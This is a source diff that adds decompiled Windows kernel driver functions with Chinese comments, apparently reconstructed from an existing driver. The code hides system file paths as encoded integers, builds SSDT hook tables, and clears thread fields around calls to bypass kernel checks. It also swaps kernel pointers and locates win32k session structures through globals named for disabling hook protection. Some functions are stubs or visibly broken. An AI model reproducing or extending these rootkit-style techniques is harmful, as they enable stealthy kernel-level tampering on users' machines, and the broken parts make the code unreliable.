@@ -2727,3 +2727,650 @@ ProcessStatus:
 // EnumerateDriverList — 枚举驱动列表
 // 对应原始驱动 sub_14003BF64
 // 遍历 PsLoadedModuleList，提取每个驱动模块的镜像基址、大小、完整路径名和基名称
+
+
+// ===== Functions moved from MissingFuncs.c =====
+
+// CheckMbrBootablePartition — 检查 MBR 可引导分区
+char CheckMbrBootablePartition(void *Buffer)
+{
+    int Index;
+    for (Index = 0; Index < 4; Index++)
+    {
+        if (*(_BYTE *)((unsigned __int64)Buffer + 446 + Index * 16) == 0x80)
+            return *(_BYTE *)((unsigned __int64)Buffer + 450 + Index * 16) == 7;
+    }
+    return 0;
+}
+
+// CmdQueryFileAllocationSize — 查询文件分配大小
+__int64 CmdQueryFileAllocationSize(void *FileHandle, _QWORD *pAllocationSize)
+{
+    __int64 AllocationSize;
+    __int64 result;
+    result = IrpReadFile(FileHandle, (struct _IRP *)&AllocationSize, 8u, 0xEu);
+    if (!(_DWORD)result) *pAllocationSize = AllocationSize;
+    return result;
+}
+
+// CmdReadFileInfo — 读取文件信息命令处理
+__int64 CmdReadFileInfo(void *FileHandle, _DWORD *pFileInfo)
+{
+    char IrpBuffer[0x28];
+    int FileInfo;
+    __int64 result;
+    result = IrpReadFile(FileHandle, (struct _IRP *)IrpBuffer, 0x28u, 4u);
+    if (!(_DWORD)result) *pFileInfo = FileInfo;
+    return result;
+}
+
+// CmdSetFileBasicInfo — 设置文件基本信息
+__int64 CmdSetFileBasicInfo(void *FileHandle, struct _IRP *FileBasicInfo)
+{
+    return IrpFileSystemControl(FileHandle, FileBasicInfo, 0x28u, 4u);
+}
+
+// CmdSendRenameFileIrp — 发送重命名文件 IRP
+__int64 CmdSendRenameFileIrp(void *FileHandle, const void *RenameBuffer, unsigned int BufferSize)
+{
+    struct _IRP *IrpBuffer;
+    unsigned int Status;
+    if (BufferSize <= 2 || (BufferSize & 1) != 0) return (unsigned int)-1073741811;
+    IrpBuffer = (struct _IRP *)ExAlloc(NonPagedPool, BufferSize + 24);
+    if (IrpBuffer)
+    {
+        IrpBuffer->MdlAddress = 0;
+        IrpBuffer->Flags = BufferSize - 2;
+        *((char *)&IrpBuffer->Type) = 1;  // LOBYTE(IrpBuffer->Type)
+        memmove(&IrpBuffer->Flags + 1, RenameBuffer, BufferSize - 2);
+        Status = IrpFileSystemControl(FileHandle, IrpBuffer, BufferSize + 24, 0xAu);
+        ExFree(IrpBuffer);
+        return Status;
+    }
+    return (unsigned int)-1073741670;
+}
+
+// ReadDisksSysFile — 读取磁盘.sys文件
+bool ReadDisksSysFile(_QWORD *FileBuffer, unsigned int *FileSize)
+{
+    bool Result;
+    size_t MaxCount;
+    void *Src;
+    int EncodedPath[20];
+
+    EncodedPath[6] = 7929971;
+    EncodedPath[17] = 7929971;
+    Result = 0;
+    EncodedPath[0] = 5439580; EncodedPath[1] = 7536761; EncodedPath[2] = 6619252;
+    EncodedPath[3] = 5374061; EncodedPath[4] = 7274607; EncodedPath[5] = 6029428;
+    EncodedPath[7] = 7602291; EncodedPath[8] = 7143525; EncodedPath[9] = 3276851;
+    EncodedPath[10] = 6553692; EncodedPath[11] = 6881394; EncodedPath[12] = 6619254;
+    EncodedPath[13] = 7536754; EncodedPath[14] = 6553692; EncodedPath[15] = 7536745;
+    EncodedPath[16] = 3014763; EncodedPath[18] = 115;
+    if (!(unsigned int)ReadFileRawData((__int16 *)EncodedPath, &Src, (ULONG *)&MaxCount, 1))
+    {
+        Result = ReadNtFileToBuffer((int *)Src, (unsigned int)MaxCount, FileBuffer, FileSize) == 1;
+        ExFree(Src);
+    }
+    return Result;
+}
+
+// ReadCdromSysFile — 读取cdrom.sys文件
+bool ReadCdromSysFile(_QWORD *FileBuffer, unsigned int *FileSize)
+{
+    bool Result;
+    size_t MaxCount;
+    void *Src;
+    int EncodedPath[18];
+    __int64 EncodedPathEnd;
+
+    Result = 0;
+    EncodedPath[0] = 5439580; EncodedPath[1] = 7536761; EncodedPath[2] = 6619252;
+    EncodedPath[3] = 5374061; EncodedPath[4] = 7274607; EncodedPath[5] = 6029428;
+    EncodedPath[6] = 7929971; EncodedPath[7] = 7602291; EncodedPath[8] = 7143525;
+    EncodedPath[9] = 3276851; EncodedPath[10] = 6553692; EncodedPath[11] = 6881394;
+    EncodedPath[12] = 6619254; EncodedPath[13] = 7536754; EncodedPath[14] = 6488156;
+    EncodedPath[15] = 7471204; EncodedPath[16] = 7143535; EncodedPath[17] = 7536686;
+    EncodedPathEnd = 7536761;
+    if (!(unsigned int)ReadFileRawData((__int16 *)EncodedPath, &Src, (ULONG *)&MaxCount, 1))
+    {
+        Result = ReadNtFileToBuffer((int *)Src, (unsigned int)MaxCount, FileBuffer, FileSize) == 1;
+        ExFree(Src);
+    }
+    return Result;
+}
+
+// DispatchDiskIrpWithHookInit — 分发磁盘 IRP 并初始化钩子
+char DispatchDiskIrpWithHookInit(void *DeviceObject, int Direction, void *Buffer, int SectorOffset, unsigned int SectorIndex, unsigned int SectorSize)
+{
+    __int64 v11[4];
+    if (QueryDeviceObjectInfo((__int64)DeviceObject, v11) != 1)
+        goto BuildHooks;
+    __int64 Result = SendDeviceIoControlIrp(v11, Direction, Buffer, SectorOffset, SectorIndex, SectorSize);
+    if ((int)Result >= 0)
+        return Result;
+BuildHooks:
+    if (!(unsigned int)GtRead(GtCallbackField37))
+        BuildSsdtHookTargets2();
+    if (!(unsigned int)GtRead(GtCallbackField44))
+        BuildSsdtHookTargets3();
+    if (!(unsigned int)GtRead(GtCallbackField49))
+        BuildSsdtHookTargets4();
+    if (!(unsigned int)GtRead(GtCallbackField61))
+        ParseStorPortExportDir();
+    return SendIrpToDiskDevice(DeviceObject, Direction, Buffer, SectorOffset, SectorIndex, SectorSize);
+}
+
+// SendCdbCommandToDevice — 发送 CDB 命令到设备
+char __fastcall SendCdbCommandToDevice(__int64 VirtualAddress)
+{
+    char Result;
+    unsigned __int8 (__fastcall *pCallback)(void *, _QWORD, _QWORD, _QWORD);
+    void *pBuffer;
+
+    Result = 0;
+    pCallback = (unsigned __int8 (__fastcall *)(void *, _QWORD, _QWORD, _QWORD))GtRead((enum _GLOBAL_TABLE_INDEX)(GtTotalSize | GtSubsystemConfigBase | GtPathBuffer00 | 0x100));
+    if (pCallback)
+    {
+        pBuffer = ExAlloc(NonPagedPool, 0x58u);
+        if (pBuffer)
+        {
+            InitIrpBufferWithCdb((__int64)pBuffer, VirtualAddress, 0, (__int64)CdbCommandCompletionCallback, 0, 0, 0, 0);
+            if (pCallback(pBuffer, 0, 0, 0) == 1)
+                return 1;
+            ExFree(pBuffer);
+        }
+    }
+    return Result;
+}
+
+// SendDiskDeviceInternalIrp — 发送磁盘设备内部 IRP
+bool __fastcall SendDiskDeviceInternalIrp(__int64 DeviceObject, struct _IRP *Irp)
+{
+    bool Result;
+    PIRP pIrp;
+    struct _IO_STACK_LOCATION *CurrentStackLocation;
+    struct _KEVENT Event;
+
+    Result = 0;
+    pIrp = IoAllocateIrp(*(_BYTE *)(DeviceObject + 76), 0);
+    if (pIrp)
+    {
+        KeInitializeEvent(&Event, SynchronizationEvent, 0);
+        CurrentStackLocation = pIrp->Tail.Overlay.CurrentStackLocation;
+        CurrentStackLocation[-1].CompletionRoutine = (PIO_COMPLETION_ROUTINE)RxTdiRequestCompletion;
+        CurrentStackLocation[-1].Control = 0xE0;
+        CurrentStackLocation[-1].Context = &Event;
+        pIrp->IoStatus.Status = 0xC0000011;
+        pIrp->IoStatus.Information = 0;
+        pIrp->AssociatedIrp.MasterIrp = (struct _IRP *)Irp;
+        CurrentStackLocation = pIrp->Tail.Overlay.CurrentStackLocation;
+        CurrentStackLocation[-1].MajorFunction = 14;
+        CurrentStackLocation[-1].Parameters.Read.ByteOffset.LowPart = 0x70000;
+        CurrentStackLocation[-1].Parameters.Read.Length = 24;
+        AllocateIrpStackAndCallDriver(0, DeviceObject, (ULONG_PTR)pIrp);
+        KeWaitForSingleObject(&Event, Executive, 0, 0, 0);
+        Result = pIrp->IoStatus.Status == 0;
+        IoFreeIrp(pIrp);
+    }
+    return Result;
+}
+
+// OpenSectionWithIoControl — 通过 IO 控制打开节区
+__int64 OpenSectionWithIoControl(__int64 a1)
+{
+    bool Result;
+    unsigned int v3;
+    unsigned int (__fastcall *v4)(__int64, __int64, _QWORD, _QWORD, _DWORD **, _QWORD);
+    void (__fastcall *v5)(_DWORD *);
+    __int64 (__fastcall *v6)(_DWORD *);
+    __int64 v7;
+    _QWORD *v8;
+    int v9;
+    struct _KTHREAD *CurrentThread;
+    __int64 v11;
+    char v12;
+    _QWORD *v13;
+    int v14;
+    _DWORD *v16;
+    __int64 v17;
+
+    Result = 0;
+    v3 = GtRead(GtSdstServiceCount);
+    v4 = (unsigned int (__fastcall *)(__int64, __int64, _QWORD, _QWORD, _DWORD **, _QWORD))GtRead(GtNtFsControlFileFunc);
+    v5 = (void (__fastcall *)(_DWORD *))GtRead(GtCloseHandleFunc);
+    v6 = (__int64 (__fastcall *)(_DWORD *))GtRead((enum _GLOBAL_TABLE_INDEX)(GtEprocessField117 | 0x100));
+    v7 = GtRead((enum _GLOBAL_TABLE_INDEX)(GtEprocessField111 | 0x100));
+    v8 = (_QWORD *)v7;
+    if (v3 != -1 && v4 && v5 && v6 && v7)
+    {
+        v9 = (unsigned int)GtRead(GtWindowsBuildNumber) >= 0x1DB0
+           ? SendDeviceIoControlWithRetry(a1, 0x10000u, 0, &v16, 0)
+           : v4(a1, 0x10000, *v8, 0, &v16, 0);
+        if (v9 >= 0)
+        {
+            CurrentThread = KeGetCurrentThread();
+            v11 = v3;
+            v12 = *((_BYTE *)CurrentThread + v3);
+            *((_BYTE *)CurrentThread + v11) = 0;
+            v13 = (_QWORD *)DispatchHookSwapByVersion((__int64)v16, &v17);
+            v14 = v6(v16);
+            if (v13)
+                *v13 = v17;
+            *((_BYTE *)CurrentThread + v11) = v12;
+            v5(v16);
+            return v14 >= 0;
+        }
+    }
+    return Result;
+}
+
+// SendFsctlWithHookSwap — 发送带钩子交换的文件系统控制
+__int64 SendFsctlWithHookSwap(
+    __int64 a1,
+    unsigned int a2,
+    __int64 a3,
+    unsigned int a4,
+    __int64 a5,
+    int a6,
+    __int64 a7)
+{
+    char Result;
+    unsigned int v8;
+    __int64 (__fastcall *v9)(__int64, _QWORD, __int64, __int64, int, __int64, _QWORD);
+    struct _KTHREAD *CurrentThread;
+    __int64 v11;
+    char v12;
+    _DWORD *v13;
+    _QWORD *v14;
+    __int64 v15;
+    __int64 *v16;
+    _DWORD *v17;
+    __int64 v18;
+    int v19;
+    int v20;
+    char v22;
+    __int64 v23;
+    void (__fastcall *v24)(_DWORD *);
+    __int64 v25[10];
+
+    Result = 0;
+    v8 = GtRead(GtSdstServiceCount);
+    v9 = (__int64 (__fastcall *)(__int64, _QWORD, __int64, __int64, int, __int64, _QWORD))GtRead((enum _GLOBAL_TABLE_INDEX)(GtEprocessField121 | 0x100));
+    v24 = (void (__fastcall *)(_DWORD *))GtRead(GtCloseHandleFunc);
+    if (v8 != -1 && v9)
+    {
+        CurrentThread = KeGetCurrentThread();
+        v11 = v8;
+        v12 = *((_BYTE *)CurrentThread + v8);
+        *((_BYTE *)CurrentThread + v8) = 0;
+        v22 = v12;
+        v13 = 0;
+        v14 = 0;
+        v15 = 0;
+        v23 = 0;
+        v16 = SwapKernelMemoryPointer(v25);
+        if (v24)
+        {
+            v17 = SendIoControlWithUnicodeString(a3);
+            v13 = v17;
+            if (v17)
+            {
+                v18 = DispatchHookSwapByVersion((__int64)v17, &v23);
+                v15 = v23;
+                v14 = (_QWORD *)v18;
+            }
+        }
+        if ((unsigned int)GtRead(GtWindowsBuildNumber) == 9200)
+            v19 = v9(a1, a2, a3, a5, a6, a7, 0);
+        else
+            v19 = ((__int64 (__fastcall *)(__int64, _QWORD, __int64, _QWORD, __int64, int, __int64, _QWORD))v9)(
+                      a1, a2, a3, a4, a5, a6, a7, 0);
+        v20 = v19;
+        if (v13)
+        {
+            if (v14)
+                *v14 = v15;
+            v24(v13);
+        }
+        if (v16)
+            *v16 = v25[0];
+        *((_BYTE *)CurrentThread + v11) = v22;
+        return v20 >= 0;
+    }
+    return Result;
+}
+
+// IrpFsctlGetVolumeData — 获取卷数据（文件系统控制）
+__int64 __fastcall IrpFsctlGetVolumeData(void *FileHandle, __int64 *pVolumeData)
+{
+    __int64 VolumeData;
+
+    VolumeData = *pVolumeData;
+    return IrpFileSystemControl(FileHandle, (struct _IRP *)&VolumeData, 8u, 0xEu);
+}
+
+// SendIrpToDiskDevice — 发送 IRP 到磁盘设备
+__int64 SendIrpToDiskDevice(struct _DEVICE_OBJECT *DeviceObject, int Command, void *Buffer, int SectorCount, int BlockSize, int BlockCount)
+{
+    return -1073741670;
+}
+
+// CdbCommandCompletionCallback — CDB 命令完成回调：释放 IRP 缓冲区，恢复当前线程标志位，调用完成通知回调
+__int64 CdbCommandCompletionCallback(void *Irp)
+{
+    __int64 (__fastcall *pNotifyFunc)(_QWORD);
+    __int64 Result;
+    unsigned int ThreadFlagOffset;
+    int FlagValue;
+    struct _KTHREAD *CurrentThread;
+    unsigned int ThreadFlagOffset2;
+    bool v7;
+    struct _KTHREAD *v8;
+    struct _KTHREAD *v9;
+
+    ExFree(Irp);
+    Result = GtRead(GtNtWriteFilePeSectionOffset | GtEprocessField42);
+    pNotifyFunc = (__int64 (__fastcall *)(_QWORD))Result;
+    if (Result)
+    {
+        if ((unsigned int)GtRead(GtWindowsBuildNumber) < 0x1DB1)
+        {
+            Result = GtRead(GtEprocessField94);
+            FlagValue = 16;
+            ThreadFlagOffset = (unsigned int)Result;
+        }
+        else
+        {
+            ThreadFlagOffset = GtRead(GtFltPeSectionAddr1 | GtEprocessField86);
+            Result = GtRead(GtWindowsBuildNumber);
+            if ((_DWORD)Result == 7601)
+            {
+                FlagValue = 0x2000;
+            }
+            else
+            {
+                Result = GtRead(GtWindowsBuildNumber);
+                if ((_DWORD)Result == 9200)
+                {
+                    FlagValue = 4096;
+                }
+                else
+                {
+                    Result = GtRead(GtWindowsBuildNumber);
+                    FlagValue = 1024;
+                    if ((_DWORD)Result == 9600)
+                        FlagValue = 2048;
+                }
+            }
+        }
+        if (ThreadFlagOffset != -1)
+        {
+            CurrentThread = KeGetCurrentThread();
+            *(_DWORD *)((char *)CurrentThread + ThreadFlagOffset) |= FlagValue;
+            ThreadFlagOffset2 = GtRead(GtEprocessField94);
+            if (ThreadFlagOffset2 != -1)
+            {
+                v7 = (unsigned int)GtRead(GtWindowsBuildNumber) < 0x23F0;
+                v8 = KeGetCurrentThread();
+                *(_DWORD *)((char *)v8 + ThreadFlagOffset2) &= ~(v7 ? 64 : 32);
+                v9 = KeGetCurrentThread();
+                *(_DWORD *)((char *)v9 + ThreadFlagOffset2) &= ~1u;
+            }
+            return (__int64)pNotifyFunc(0);
+        }
+    }
+    return Result;
+}
+
+// RxTdiRequestCompletion — RxTDI 请求完成回调：IRP 完成例程，设置事件对象通知等待者
+__int64 __fastcall RxTdiRequestCompletion(__int64 DeviceObject, __int64 Irp, struct _KEVENT *pEvent)
+{
+    if (pEvent)
+        KeSetEvent(pEvent, 0, 0);
+    return 0xC0000016LL;
+}
+
+// ReadSystemDllAndInitSession — 读取系统 DLL 并初始化会话：读取系统 DLL 文件，解析 PE 格式，比较 PE 头，初始化会话状态表
+__int64 ReadSystemDllAndInitSession(void)
+{
+    char Result;
+    size_t MaxCount;
+    void *Src;
+    unsigned int PeFileSize;
+    void *pPeFileBuffer;
+    int EncodedBuffer[24];
+    __int64 SessionTableBase;
+    unsigned int SessionTableSize;
+
+    Result = 0;
+    EncodedBuffer[0] = 0x53005C;
+    EncodedBuffer[1] = 0x730079;
+    EncodedBuffer[2] = 0x650074;
+    EncodedBuffer[3] = 0x52006D;
+    EncodedBuffer[4] = 0x6F006F;
+    EncodedBuffer[5] = 0x5C0074;
+    EncodedBuffer[6] = 0x790073;
+    EncodedBuffer[7] = 0x740073;
+    EncodedBuffer[8] = 0x6D0065;
+    EncodedBuffer[9] = 0x320033;
+    EncodedBuffer[10] = 0x5C0077;
+    EncodedBuffer[11] = 0x6E0069;
+    EncodedBuffer[12] = 0x320033;
+    EncodedBuffer[13] = 0x6B0073;
+    EncodedBuffer[14] = 0x670064;
+    EncodedBuffer[15] = 0x2E0073;
+    EncodedBuffer[16] = 0x640064;
+    EncodedBuffer[17] = 0x6C006C;
+    EncodedBuffer[18] = 0x0;
+    if (!(unsigned int)ReadFileRawData((__int16 *)EncodedBuffer, &Src, (ULONG *)&MaxCount, 1))
+    {
+        if (ReadNtFileToBuffer((int *)Src, (unsigned int)MaxCount, &pPeFileBuffer, &PeFileSize) == 1)
+            Result = 1;
+        else
+            Result = 0;
+        ExFree(Src);
+        if (Result == 1)
+        {
+            SessionTableBase = GtRead((GLOBAL_TABLE_INDEX)0x91B);
+            SessionTableSize = GtRead((GLOBAL_TABLE_INDEX)0x91C);
+            if (pPeFileBuffer && PeFileSize && SessionTableBase && SessionTableSize > 0x1001)
+            {
+                if (ComparePeHeaders(SessionTableBase, SessionTableSize, (__int64)pPeFileBuffer, PeFileSize) == 1)
+                {
+                    Result = 1;
+                }
+                else
+                {
+                    if (InitSessionStateTable((__int64)pPeFileBuffer, PeFileSize) == 1)
+                        Result = 1;
+                    else
+                        Result = 0;
+                }
+            }
+            else
+            {
+                if (InitSessionStateTable((__int64)pPeFileBuffer, PeFileSize) == 1)
+                    Result = 1;
+                else
+                    Result = 0;
+            }
+            ExFree(pPeFileBuffer);
+        }
+    }
+    return Result;
+}
+
+// InitIrpBufferWithCdb — 初始化带 CDB 的 IRP 缓冲区，设置 SCSI 命令描述块(CDB)参数到 SRB 结构
+void InitIrpBufferWithCdb(__int64 Buffer, __int64 Address, unsigned int Flags, __int64 CompletionRoutine, unsigned int BlockSize, unsigned int BlockCount, unsigned int CdbFlags, unsigned int CdbParam)
+{
+    __int64 (__fastcall *pInitFunc)(__int64, __int64, __int64, __int64, __int64, __int64, char, __int64);
+    __int64 Result;
+
+    pInitFunc = (__int64 (__fastcall *)(__int64, __int64, __int64, __int64, __int64, __int64, char, __int64))GtRead(GtNtWriteFilePeSectionOffset | GtEprocessField54);
+    if (pInitFunc && Flags == 2)
+    {
+        pInitFunc(Buffer, Address, 2, CompletionRoutine, BlockSize, BlockCount, CdbFlags, CdbParam);
+        return;
+    }
+    *(_BYTE *)Buffer = 0x12;
+    *(_BYTE *)(Buffer + 2) = 0x58;
+    *(_QWORD *)(Buffer + 40) = BlockSize;
+    *(_BYTE *)(Buffer + 80) = Flags;
+    *(_QWORD *)(Buffer + 8) = Address;
+    *(_QWORD *)(Buffer + 32) = CompletionRoutine;
+    *(_QWORD *)(Buffer + 48) = BlockCount;
+    if (BlockCount)
+    {
+        *(_BYTE *)(Buffer + 81) = CdbFlags;
+        *(_QWORD *)(Buffer + 56) = CdbParam;
+    }
+    else
+    {
+        *(_BYTE *)(Buffer + 81) = 0;
+        *(_QWORD *)(Buffer + 56) = 0;
+    }
+    *(_BYTE *)(Buffer + 82) = 0;
+}
+
+// ReadRawFileToBuffer — 读取原始文件到缓冲区
+// 通过编码路径字符串读取 ntoskrnl.exe 文件到内存缓冲区
+char __fastcall ReadRawFileToBuffer(_QWORD *pFileBuffer, unsigned int *pFileSize)
+{
+    bool Result;
+    size_t MaxCount;
+    void *pRawData;
+    int EncodedPath[20];
+
+    // 编码的 ntoskrnl.exe 路径
+    EncodedPath[0] = 5439580;
+    EncodedPath[1] = 7536761;
+    EncodedPath[2] = 6619252;
+    EncodedPath[3] = 5374061;
+    EncodedPath[4] = 7274607;
+    EncodedPath[5] = 6029428;
+    EncodedPath[6] = 7929971;
+    EncodedPath[7] = 7602291;
+    EncodedPath[8] = 7143525;
+    EncodedPath[9] = 3276851;
+    EncodedPath[10] = 6553692;
+    EncodedPath[11] = 6881394;
+    EncodedPath[12] = 6619254;
+    EncodedPath[13] = 7536754;
+    EncodedPath[14] = 5505116;
+    EncodedPath[15] = 3014765;
+    EncodedPath[16] = 7929971;
+    EncodedPath[17] = 115;
+
+    Result = 0;
+    if (!(unsigned int)ReadFileRawData((__int16 *)EncodedPath, &pRawData, (ULONG *)&MaxCount, 1))
+    {
+        Result = (ReadNtFileToBuffer((PUCHAR)pRawData, (unsigned int)MaxCount, (PUCHAR *)pFileBuffer, (PULONG)pFileSize) == 1);
+        ExFree(pRawData);
+    }
+    return Result;
+}
+
+// InitSessionStateTable — 初始化会话状态表
+// 在 win32k 中查找 SGDGetSessionState 和 SGDSessionInitialize 导出，定位会话状态数据结构
+char __fastcall InitSessionStateTable(__int64 PeBase, unsigned int PeSize)
+{
+    char Result;
+    __int64 NtoskrnlBase;
+    unsigned int SectionOffset1;
+    unsigned int SectionOffset2;
+    unsigned int EntryIndex;
+    int CurrentOffset;
+    __int16 SectionType;
+    int NextOffset;
+    int EntryField;
+    __int64 v15;
+    __int64 ReadContext;
+    __int64 CumulativeSize;
+    _DWORD SectionEntry[20];
+    unsigned int EntrySize;
+    __int64 SectionFlags;
+    __int64 FieldValue;
+    unsigned int EntryCumulSize;
+    __int64 EntryDataPtr;
+    _WORD ExportName[12];
+
+    Result = 0;
+    strcpy((char *)ExportName, "SGDGetSessionState");
+    *((unsigned char *)&ExportName[9] + 1) = 0;
+
+    NtoskrnlBase = GtRead(GtDisableHookProtectionAddr2 | GtNtoskrnlModuleBase | 0x100);
+    if (!NtoskrnlBase)
+        return Result;
+
+    SectionOffset1 = 0;
+    SectionOffset2 = 0;
+
+    if (LookupExportByName(PeBase, PeSize, (__int64)ExportName, &SectionOffset1) != 1 || !SectionOffset1 || SectionOffset1 >= PeSize || SectionOffset1 + 4096 >= PeSize)
+        return Result;
+
+    InitPESectionReadContext(PeBase + SectionOffset1, 4096, 2, 0, -1, 0, 0, (__int64)&ReadContext);
+    EntryIndex = 0;
+    while (!(unsigned int)ReadPESectionEntry(&ReadContext, SectionEntry))
+    {
+        CurrentOffset = EntryCumulSize + (int)CumulativeSize;
+        CumulativeSize += EntryCumulSize;
+        SectionType = *(_WORD *)(EntryDataPtr + 6);
+        if (SectionType == 1298 && FieldValue == 0x40000 && EntrySize && v15 == 64)
+        {
+            if (!SectionOffset1)
+            {
+                SectionOffset1 = CurrentOffset + EntrySize - PeBase;
+                goto LABEL_CHECK;
+            }
+        }
+        else if (SectionType == 1296 && FieldValue == 0x40000 && EntrySize && v15 == 64 && !SectionOffset2)
+        {
+            SectionOffset2 = CurrentOffset + EntrySize - PeBase;
+        }
+
+LABEL_CHECK:
+        if (SectionOffset1 && SectionOffset2 && SectionOffset1 < PeSize && SectionOffset2 < PeSize)
+        {
+            GtWrite(GtDisableHookProtectionAddr2 | GtPathBuffer02 | 0x100, NtoskrnlBase + SectionOffset1);
+            GtWrite(GtDisableHookProtectionAddr2 | GtPathBuffer01 | 0x100, NtoskrnlBase + SectionOffset2);
+            break;
+        }
+
+        if (++EntryIndex >= 0x1E)
+            break;
+    }
+
+    if (SectionOffset1 && SectionOffset2)
+    {
+        strcpy((char *)ExportName, "SGDSessionInitialize");
+        *((unsigned char *)&ExportName[10] + 1) = 0;
+        ExportName[11] = 0;
+
+        if (LookupExportByName(PeBase, PeSize, (__int64)ExportName, &SectionOffset1) == 1 && SectionOffset1 && SectionOffset1 < PeSize && SectionOffset1 + 4096 < PeSize)
+        {
+            InitPESectionReadContext(PeBase + SectionOffset1, 4096, 2, 0, -1, 0, 0, (__int64)&ReadContext);
+            EntryIndex = 0;
+            while (!(unsigned int)ReadPESectionEntry(&ReadContext, SectionEntry))
+            {
+                CurrentOffset = EntryCumulSize + (int)CumulativeSize;
+                CumulativeSize += EntryCumulSize;
+                if (*(_WORD *)(EntryDataPtr + 6) == 1245 && FieldValue == 0x40000)
+                {
+                    if (EntrySize && v15 == 32 && SectionEntry[2] == 1)
+                    {
+                        NextOffset = CurrentOffset + EntrySize - PeBase;
+                        if (NextOffset && (unsigned int)NextOffset < PeSize)
+                        {
+                            GtWrite(GtDisableHookProtectionAddr2 | GtPathBuffer03 | 0x100, NtoskrnlBase + NextOffset);
+                            return 1;
+                        }
+                    }
+                }
+                if (++EntryIndex >= 0x64)
+                    return Result;
+            }
+        }
+    }
+    return Result;
+}
